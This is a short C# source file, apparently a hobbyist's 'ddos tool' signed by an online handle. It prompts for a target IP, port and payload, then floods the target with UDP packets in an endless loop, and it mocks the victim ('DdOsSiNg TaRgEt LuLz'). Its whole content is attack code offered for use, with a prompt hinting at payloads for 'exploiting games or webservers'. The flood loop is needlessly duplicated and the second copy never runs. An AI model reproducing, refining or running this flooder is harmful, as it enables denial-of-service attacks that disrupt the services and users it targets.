using System.Net.Sockets;
using System.Collections.Specialized;
using System.Net.Sockets;
using System;
using System.Text;
using System.IO;
using System.Net;
using System.Threading;

namespace ddos{
    public static class typedef{
        static void SendUdp(int srcPort, string dstIp, int dstPort, byte[] data)
{
    using (UdpClient c = new UdpClient(srcPort))
    for (;;)
        c.Send(data, data.Length, dstIp, dstPort);
}
static void Main(){
    Console.WriteLine("Welcome to netcats ddos tool, written in c#!");
    Console.WriteLine("Made by netcat420#6708");
    Console.WriteLine("Enter ip address to DDOS:");
    string dstIp = Console.ReadLine();
    Console.WriteLine("Enter Target Port:");
    string dstPortHandle = Console.ReadLine();
    int dstPort = Convert.ToInt32(dstPortHandle);
    Console.WriteLine("Enter the Port your machine will use for the connection:");
    string srcPortHandle = Console.ReadLine();
    int srcPort = Convert.ToInt32(srcPortHandle);
    Console.WriteLine("data to send to target (can be anything, gibberish will spam targets, or it could be customized for use in exploiting games or webservers):");
    string dataHandle = Console.ReadLine();
    byte[] data = Encoding.ASCII.GetBytes(dataHandle);
    Console.WriteLine("DdOsSiNg TaRgEt LuLz");
    SendUdp(srcPort, dstIp, dstPort, data);
     using (UdpClient c = new UdpClient(srcPort))
    for (;;)
        c.Send(data, data.Length, dstIp, dstPort);


    }

    }















}
